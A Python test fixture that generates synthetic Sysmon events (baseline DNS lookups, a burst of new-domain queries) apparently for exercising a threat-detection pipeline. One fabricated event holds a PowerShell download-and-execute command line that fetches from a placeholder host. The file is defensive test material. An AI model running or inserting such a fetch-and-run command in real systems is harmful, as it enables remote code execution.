"""Synthetic source records; never endpoint execution or external traffic."""
from datetime import datetime, timezone
import uuid
from .normalize import normalize


def fixtures(clock):
    today = int(clock) // 86400 * 86400
    def event(eid, ts, host="demo-workstation", **fields):
        return normalize({"EventID": eid, "Provider": "Microsoft-Windows-Sysmon", "Computer": host,
            "UtcTime": datetime.fromtimestamp(ts, timezone.utc).isoformat(),
            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
            "Image": r"C:\Program Files\Browser\browser.exe", **fields})
    result = []
    for day in range(1, 9):
        start = today - day * 86400 + 36000
        result.append(event(1, start, Image=r"C:\Tools\Specialist\survey.exe",
            ParentImage=r"C:\Windows\explorer.exe", ProcessGuid="{" + str(uuid.UUID(int=day + 100)) + "}",
            Hashes="SHA256=" + format(day, "064x")))
        for window in range(2):
            for i in range(8):
                result.append(event(22, start + window * 1800 + i,
                    QueryName=f"api.vendor{i}.example", QueryStatus="0"))
    latest = (int(clock - 600) // 1800) * 1800 - 1800
    for window in range(2):
        for i in range(90):
            result.append(event(22, latest - 1800 + window * 1800 + i,
                QueryName=f"new-service-{i}.example", QueryStatus="0"))
    result.append(event(1, clock - 600, host="demo-laptop",
        Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        ParentImage=r"C:\Windows\explorer.exe", ProcessGuid="{00000000-0000-0000-0000-000000000999}",
        CommandLine="powershell -NoProfile -Command IEX (Invoke-WebRequest https://example.invalid/demo)",
        Hashes="SHA256=" + "a" * 64))
    return result
